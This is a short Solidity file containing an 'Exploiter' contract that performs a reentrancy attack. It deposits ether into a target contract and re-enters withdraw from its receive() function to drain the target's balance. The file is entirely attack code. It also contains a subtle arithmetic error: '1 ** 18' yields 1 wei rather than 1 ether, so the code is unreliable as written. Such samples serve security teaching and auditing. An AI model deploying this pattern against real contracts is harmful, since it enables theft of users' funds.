// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ExploitableContract {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract Exploiter {
    ExploitableContract public exploitableContract;

    constructor(address _exploitableContract) {
        exploitableContract = ExploitableContract(_exploitableContract);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    receive() external payable {
        if (address(exploitableContract).balance >= 1 ether) {
            exploitableContract.withdraw(1 ** 18);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        exploitableContract.deposit{value: 1 ether}();
        exploitableContract.withdraw(1 ** 18);
    }
}
